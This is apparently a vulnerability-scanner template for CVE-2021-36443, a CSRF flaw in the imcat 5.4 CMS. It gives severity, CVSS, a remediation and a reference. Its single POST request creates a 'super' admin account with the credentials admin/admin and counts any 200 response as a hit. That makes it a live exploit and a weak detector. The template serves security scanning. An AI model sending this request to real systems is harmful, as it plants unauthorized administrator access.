id: CVE-2021-36443

info:
  name: CSRF Vulnerability in imcat 5.4
  author: ProjectDiscoveryAI
  severity: high
  description: Cross Site Request Forgery vulnerability in imcat 5.4 allows remote attackers to escalate privilege via lack of token verification.
  impact: |
    Successful exploitation could lead to unauthorized actions being performed by attackers on behalf of authenticated users.
  remediation: |
    Implement CSRF tokens and ensure proper validation of requests to prevent CSRF attacks.
  reference:
    - https://github.com/peacexie/imcat/issues/9
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2021-36443
    cwe-id: CWE-352
    epss-score: 0.00155
    epss-percentile: 0.52983
    cpe: cpe:2.3:a:txjia:imcat:5.4:*:*:*:*:*:*:*
  metadata:
    vendor: txjia
    product: imcat

http:
  - method: POST
    path:
      - "{{BaseURL}}/imcat/root/run/adm.php?dops-a&mod=adminer&view=form&stype="

    body: |
      uid=admin&uno=admin&uname=admin&upass=admin&grade=super&show=1&mname=admin&indep=0&miuid=admin&mtel=1234567890&memail=admin@example.com&maddr=Unknown&atime={{unix_time}}&etime={{unix_time}}&auser=admin&euser=admin&aip={{rand_ip}}&eip={{rand_ip}}&bsend=1&mod=admin&isadd=1

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: status
        status:
          - 200
